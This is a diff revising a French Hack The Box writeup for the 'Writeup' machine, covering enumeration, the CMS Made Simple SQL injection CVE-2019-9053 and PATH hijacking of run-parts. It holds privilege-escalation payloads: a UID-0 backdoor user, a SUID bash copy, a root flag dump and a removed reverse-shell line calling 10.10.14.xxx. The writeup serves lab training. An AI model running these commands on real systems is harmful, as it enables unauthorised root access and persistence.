@@ -36,7 +36,7 @@ cover:
 ctf:
   platform: "Hack The Box"
   machine: "Writeup"
-  difficulty: "Easy | Medium | Hard"
+  difficulty: "Easy"
   target_ip: "10.129.x.x"
   skills: ["Enumeration","Web","Privilege Escalation"]
   time_spent: "2h"
@@ -127,7 +127,7 @@ Ce writeup décrit la résolution complète de la machine **writeup.htb** sur Ha
 
 Pour démarrer :
 
-- entre l'adresse IP de la cible `10.129.x.x   writeup.htb`  dans /etc/hosts 
+- “Ajoute l’entrée `10.129.x.x writeup.htb` dans /etc/hosts. 
 
 ```bash
 sudo nano /etc/hosts
@@ -389,7 +389,7 @@ Dans ce contexte typique d'un site en cours de développement, l'utilisation d'u
 
 ### robots.txt
 
-```txt
+```bash
 curl http://writeup.htb/robots.txt
 #              __
 #      _(\    |@@|
@@ -419,8 +419,7 @@ La balise `Generator` permet d'identifier sans ambiguïté le CMS utilisé : **C
 
 ### CMS Made Simple
 
-Une fois le CMS identifié comme **CMS Made Simple**, tu peux rechercher les vulnérabilités connues affectant ses versions anciennes. Une recherche simple du type *“CMS Made Simple unauthenticated SQL injection”* ou *“CMS Made Simple CVE exploit”* permet de mettre rapidement en évidence la vulnérabilité **CVE-2019-9053**, une injection SQL non authentifiée dans le module *News*. Cette recherche mène notamment à des exploits publics, comme la version Python 3 disponible ici :
- https://github.com/Dh4nuJ4/SimpleCTF-UpdatedExploit/blob/main/updated_46635.py
+Une fois le CMS identifié comme **CMS Made Simple**, tu peux rechercher les vulnérabilités connues affectant ses versions anciennes. Une recherche simple du type *“CMS Made Simple unauthenticated SQL injection”* ou *“CMS Made Simple CVE exploit”* permet de mettre rapidement en évidence la vulnérabilité **CVE-2019-9053**, une injection SQL non authentifiée dans le module *News*. Cette recherche mène notamment à des exploits publics? On trouve facilement un PoC public Python3 pour CVE-2019-9053.
 
 > Sous Python 3, l'exploit échoue lors du cracking à cause de l'encodage de `rockyou.txt`. 
 >
@@ -621,49 +620,12 @@ Les résultats montrent notamment que `jkr` dispose des droits d'écriture sur `
 
 Dans ce contexte, si `jkr` place son propre script nommé `run-parts` dans `/usr/local/bin`, c'est ce script qui sera exécuté **en priorité**, à la place du binaire légitime situé dans `/bin`. Ce mécanisme est appelé **détournement de `PATH`** : lorsqu'une commande est invoquée sans chemin absolu, le système exécute le premier fichier correspondant trouvé dans le `PATH`. Il s'agit d'une technique classique et très courante en CTF pour obtenir une escalade de privilèges.
 
+------
+
 ### Détournement de PATH
 
-Pour exploiter le détournement de `PATH`, tu vas créer un **faux script `run-parts`** dans un répertoire présent dans le `PATH` et accessible en écriture par `jkr`, par exemple `/usr/local/bin`.
-
-Voici quelques idées pour des faux `run-parts` :
-
-1. Le plus simple: faire un `cat` de /root/root.txt vers par exemple /tmp/root.txt`
-
-   ```bash
-   #!/bin/bash
-   cat /root/root.txt > /tmp/root.txt
-   ```
-
-   
-
-2. Ajouter/créer un utilisateur avec des droits root
-
-   ```bash
-   #!/bin/bash 
-   useradd -m -p $(openssl passwd -1 "password") -s /bin/bash -o -u 0 jkroot
-   ```
-
-   et faire `su jkrout`
-   
-3. Copier /bin/bash vers /bin/<nom au choix> et lui donner les droits SUID d'exécution root (u+s)
-
-   ```bash
-   #!/bin/bash
-   cp /bin/bash /bin/ctf
-   chmod u+s /bin/ctf 
-   ```
-
-   et faire `/bin/ctf -p`
-   
-4. Lancer un reverse shell
-
-   ```bash
-   #!/bin/bash
-   bash -i >& /dev/tcp/10.10.14.xxx/4444 0>&1 
-   ```
-
-   avec `nc -lvnp 4444` dans Kali
-
+Pour exploiter le détournement de PATH, on va mettre en place un faux run-parts dans un répertoire présent dans le PATH et inscriptible par jkr (par exemple /usr/local/bin).
+L’objectif est que, lors de la connexion SSH, le système exécute notre script à la place du binaire légitime, ce qui déclenchera un reverse shell en tant que root vers ta machine Kali.
 
 
 ---
@@ -823,5 +785,35 @@ Ce writeup de la machine **writeup.htb** sur **Hack The Box** met en évidence u
 
 ## Bonus
 
-Je te laisse le plaisir d’explorer et de mettre en œuvre les autres pistes de détournement de PATH évoquées plus haut, l’objectif ici étant surtout de t’avoir montré une méthode fiable et reproductible pour gérer un contexte contraint par le temps.
+Voici quelques idées pour des faux `run-parts` :
+
+1. Le plus simple: faire un `cat` de `/root/root.txt` vers par exemple `/tmp/root.txt`
+
+   ```bash
+   #!/bin/bash
+   cat /root/root.txt > /tmp/root.txt
+   ```
+
+   
+
+2. Ajouter/créer un utilisateur avec des droits root
+
+   ```bash
+   #!/bin/bash 
+   useradd -m -p $(openssl passwd -1 "password") -s /bin/bash -o -u 0 jkroot
+   ```
+
+   et faire `su jkroot`
+   
+3. Copier /bin/bash vers /bin/<nom au choix> et lui donner les droits SUID d'exécution root (u+s)
+
+   ```bash
+   #!/bin/bash
+   cp /bin/bash /bin/ctf
+   chmod u+s /bin/ctf 
+   ```
+
+   et faire `/bin/ctf -p`
+
+Je te laisse le plaisir d’explorer et de mettre en œuvre ces autres pistes de détournement de PATH, l’objectif ici étant surtout de t’avoir montré une méthode fiable et reproductible pour gérer un contexte contraint par le temps.
 
